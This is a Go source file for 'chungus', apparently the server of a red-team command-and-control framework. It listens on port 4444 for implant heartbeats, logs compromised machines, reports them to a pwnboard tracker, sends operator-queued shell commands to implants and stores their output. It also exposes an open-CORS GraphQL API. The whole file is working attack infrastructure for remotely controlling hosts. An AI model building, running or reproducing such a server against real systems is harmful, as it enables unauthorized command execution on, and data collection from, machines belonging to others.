package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/BradHacker/chungus/ent"
	"github.com/BradHacker/chungus/ent/implant"

	"github.com/BradHacker/chungus/ent/task"
	"github.com/BradHacker/chungus/graph"
	"github.com/BradHacker/chungus/pb"
	"github.com/BradHacker/chungus/pwnboard"
	"github.com/BradHacker/chungus/utils"

	"github.com/99designs/gqlgen/graphql/handler"
	"github.com/99designs/gqlgen/graphql/playground"
	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
	"google.golang.org/protobuf/proto"
)

var IMPLANT_NAME = "chungus"

func ListenOnPort(port int) (net.Listener, error) {
	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		return nil, fmt.Errorf("error while listening on 0.0.0.0:%d:%v", port, err)
	}
	return listener, nil
}

// func GenerateTask(heartbeat *ent.Heartbeat) (*pb.Task, error) {
// 	ctx := context.Background()
// 	nextTask, err := heartbeat.QueryImplant().QueryTasks().Where(task.Not(task.HasHeartbeat())).Order(ent.Asc(task.FieldCreatedAt)).First(ctx)
// 	if err != nil {
// 		return &pb.Task{
// 			Uuid:          "",
// 			HeartbeatUuid: "",
// 			Type:          pb.Task_NOOP,
// 			Payload:       "",
// 		}, nil
// 	}
// 	var task_type pb.Task_TaskType
// 	if nextTask.Type == task.TypeCMD {
// 		task_type = pb.Task_CMD
// 	} else {
// 		task_type = pb.Task_SCRIPT
// 	}
// 	return &pb.Task{
// 		Uuid:          nextTask.UUID,
// 		HeartbeatUuid: heartbeat.UUID,
// 		Type:          task_type,
// 		Payload:       nextTask.Payload,
// 	}, nil
// }

func SendNoOp(c net.Conn) error {
	t := pb.Task{
		Uuid:          "",
		HeartbeatUuid: "",
		Type:          pb.Task_NOOP,
		Payload:       "",
	}

	taskBytes, err := proto.Marshal(&t)
	if err != nil {
		return fmt.Errorf("error marshalling task: %v", err)
	}

	_, err = c.Write(taskBytes)
	if err != nil {
		return fmt.Errorf("error sending NOOP task: %v", err)
	}
	return nil
}

func HandleConnection(client *ent.Client, c net.Conn) {
	defer c.Close()

	ip_parts := strings.Split(c.RemoteAddr().String(), ":")
	port, err := strconv.Atoi(ip_parts[1])
	if err != nil {
		port = 0
	}

	go pwnboard.SendUpdate(ip_parts[0], IMPLANT_NAME)

	ctx := context.Background()
	defer ctx.Done()

	hbBuffer := make([]byte, 4096)
	hbNumBytes, err := c.Read(hbBuffer)
	if err != nil {
		fmt.Printf("error reading from connection: %v\n", err)
		return
	}
	if err != nil {
		fmt.Printf("error trimming buffer: %v\n", err)
		return
	}
	hb := pb.Heartbeat{}
	err = proto.Unmarshal(hbBuffer[:hbNumBytes], &hb)
	if err != nil {
		fmt.Printf("error while unmarshalling: %v\n%v\n", err, hbBuffer)
		return
	}

	imp, err := client.Implant.Query().Where(implant.MachineIDEQ(hb.MachineId)).Only(ctx)
	if ent.IsNotFound(err) {
		imp, err = client.Implant.Create().SetUUID(uuid.NewString()).SetMachineID(hb.MachineId).Save(ctx)
		if err != nil {
			fmt.Printf("error while creating implant in db: %v", err)
			err = SendNoOp(c)
			if err != nil {
				fmt.Printf("error sending NOOP")
			}
			return
		}
	} else if err != nil {
		fmt.Printf("error while querying implant in db: %v", err)
		err = SendNoOp(c)
		if err != nil {
			fmt.Printf("error sending NOOP")
		}
		return
	}

	err = imp.Update().SetLastSeenAt(time.Now()).Exec(ctx)
	if err != nil {
		fmt.Printf("error updating last seen at: %v\n", err)
	}

	heartbeat, err := client.Heartbeat.Create().SetUUID(uuid.NewString()).SetImplant(imp).SetPid(int(hb.Pid)).SetIP(ip_parts[0]).SetPort(port).Save(ctx)
	if err != nil {
		fmt.Printf("error creating heartbeat in db: %v", err)
		err = SendNoOp(c)
		time.Sleep(30 * time.Second)
		if err != nil {
			fmt.Printf("error sending NOOP")
		}
		return
	}

	nextTask, err := imp.QueryTasks().Where(task.HasRunEQ(false)).Order(ent.Asc(task.FieldCreatedAt)).First(ctx)
	if err != nil {
		if ent.IsNotFound(err) {
			err = SendNoOp(c)
			if err != nil {
				fmt.Printf("error sending NOOP")
			}
			return
		}
		fmt.Printf("error querying tasks from implant: %v", err)
		return
	}

	var task_type pb.Task_TaskType
	if nextTask.Type == task.TypeCMD {
		task_type = pb.Task_CMD
	} else {
		task_type = pb.Task_SCRIPT
	}
	t := pb.Task{
		Uuid:          nextTask.UUID,
		HeartbeatUuid: heartbeat.UUID,
		Type:          task_type,
		Payload:       nextTask.Payload,
	}

	taskBytes, err := proto.Marshal(&t)
	if err != nil {
		fmt.Printf("error marshalling protobuf: %v\n", err)
		err = SendNoOp(c)
		if err != nil {
			fmt.Printf("error sending NOOP")
		}
		return
	}

	_, err = c.Write(taskBytes)
	if err != nil {
		fmt.Printf("error sending task to implant: %v", err)
		err = SendNoOp(c)
		if err != nil {
			fmt.Printf("error sending NOOP")
		}
		return
	}

	readResponseBuffer := make([]byte, 16000)
	numResBytes, err := c.Read(readResponseBuffer)
	if err != nil {
		fmt.Printf("error reading from connection: %v", err)
		return
	}
	resBuffer, err := utils.TrimBuffer(readResponseBuffer)
	if err != nil {
		fmt.Printf("error trimming buffer: %v", err)
		return
	}
	res := pb.TaskResponse{}
	err = proto.Unmarshal(resBuffer[:numResBytes], &res)
	if err != nil {
		fmt.Printf("error while unmarshalling: %v", err)
		return
	}
	fmt.Printf("%v\n", res)

	err = client.Task.Update().Where(task.UUIDEQ(res.Uuid)).SetHasRun(true).SetStdout(res.Stdout).SetStderr(res.Stderr).Exec(ctx)
	if err != nil {
		fmt.Printf("error updating task with response in db: %v", err)
		return
	}
}

func StartListening(client *ent.Client, port int) {
	listener, err := ListenOnPort(port)
	if err != nil {
		fmt.Printf("couldn't listen on port: %v\n", err)
		return
	}

	for {
		con, err := listener.Accept()
		if err != nil {
			fmt.Printf("error accepting connection: %v\n", err)
			return
		}

		go HandleConnection(client, con)
	}
}

func ListImplants(ctx context.Context, client *ent.Client) {
	implants, err := client.Implant.Query().WithHeartbeats().All(ctx)
	if err != nil {
		fmt.Printf("error querying implants: %v\n", err)
		return
	}

	fmt.Println("-------")
	for i, imp := range implants {
		fmt.Printf("%d) %v | %s\n", i+1, imp.LastSeenAt, imp.MachineID)
	}
	fmt.Println("-------")
	fmt.Println("")

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Press \033[1;36m<enter>\033[0m to continue...")
	reader.ReadString('\n')

}

func ScheduleTask(ctx context.Context, client *ent.Client) {
	reader := bufio.NewReader(os.Stdin)
	var mid string
	var err error
	for {
		fmt.Printf("Enter an implant id \033[1;36m(MachineId)\033[0m to set a task for: ")
		mid, err = reader.ReadString('\n')
		if err != nil {
			fmt.Printf("\033[31mERROR: couldn't read input\033[0m\n")
			continue
		} else {
			break
		}
	}
	machineId := strings.TrimSuffix(mid, "\n")

	imp, err := client.Implant.Query().Where(implant.MachineIDEQ(machineId)).Only(ctx)
	if err != nil {
		fmt.Printf("error couldn't get implant with machine id = %s: %v\n", machineId, err)
	}

	fmt.Printf("Enter a command to run: ")
	cmd, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("\033[31mERROR: couldn't read input\033[0m\n")
		return
	}
	payload := strings.TrimSuffix(cmd, "\n")

	_, err = client.Task.Create().SetImplant(imp).SetType(task.TypeCMD).SetUUID(uuid.NewString()).SetPayload(payload).SetStdout("").SetStderr("").Save(ctx)
	if err != nil {
		fmt.Printf("\033[31mERROR: couldn't save task\033[0m\n")
		return
	}
	fmt.Printf("\033[1;32mSUCCESS:\033[21m saved task successfully\033[0m\n")
}

// Defining the Graphql handler
func graphqlHandler(client *ent.Client) gin.HandlerFunc {
	// NewExecutableSchema and Config are in the generated.go file
	// Resolver is in the resolver.go file
	h := handler.NewDefaultServer(graph.NewSchema(client))

	return func(c *gin.Context) {
		h.ServeHTTP(c.Writer, c.Request)
	}
}

// Defining the Playground handler
func playgroundHandler() gin.HandlerFunc {
	h := playground.Handler("GraphQL", "/query")

	return func(c *gin.Context) {
		h.ServeHTTP(c.Writer, c.Request)
	}
}

func main() {
	client, err := ent.Open("sqlite3", "file:test.sqlite?_loc=auto&cache=shared&_fk=1")
	if err != nil {
		log.Fatalf("failed opening connection to sqlite: %v", err)
	}
	fmt.Println("ENT Databasse Initialized...")

	defer client.Close()
	ctx := context.Background()

	// Auto migrate the database
	if err := client.Schema.Create(ctx); err != nil {
		log.Fatalf("failed creating schema resources: %v", err)
	}

	go StartListening(client, 4444)

	port := os.Getenv("PORT")
	if port == "" {
		port = ":8080"
	}

	r := gin.Default()

	// Cors magic 🤩
	r.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"*"},
		AllowMethods:     []string{"GET", "PUT", "PATCH"},
		AllowHeaders:     []string{"Content-Type", "Content-Length", "Accept-Encoding", "X-CSRF-Token", "Authorization", "accept", "origin", "Cache-Control", "X-Requested-With"},
		AllowCredentials: true,
	}))

	r.GET("/ping", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"message": "pong",
		})
	})
	r.POST("/query", graphqlHandler(client))
	r.GET("/playground", playgroundHandler())
	r.Run(port)

	// for {
	// 	cmd := exec.Command("clear") //Linux example, its tested
	// 	cmd.Stdout = os.Stdout
	// 	cmd.Run()
	// 	fmt.Println("Select an option")
	// 	fmt.Println("----------------")
	// 	fmt.Println("\033[34m1) \033[0mList connected implants")
	// 	fmt.Println("\033[34m2) \033[0mSchedule a task")
	// 	fmt.Println("\033[34m0) \033[0mExit")
	// 	reader := bufio.NewReader(os.Stdin)
	// 	fmt.Print("Select an option \033[34m(1-4)\033[0m: ")
	// 	option, err := reader.ReadString('\n')
	// 	if err != nil {
	// 		fmt.Printf("\033[31mERROR: couldn't read input\033[0m")
	// 		time.Sleep(5 * time.Second)
	// 		continue
	// 	}
	// 	// fmt.Printf("%v (%s), %v (%s)", option, option, "0", "0")
	// 	numberChosen := strings.TrimSuffix(option, "\n")
	// 	if numberChosen == "0" {
	// 		break
	// 	} else if numberChosen == "1" {
	// 		ListImplants(ctx, client)
	// 	} else if numberChosen == "2" {
	// 		ScheduleTask(ctx, client)
	// 	} else {
	// 		fmt.Printf("\033[1;31mERROR: invalid command\033[0m")
	// 		time.Sleep(1 * time.Second)
	// 		continue
	// 	}
	// }
}
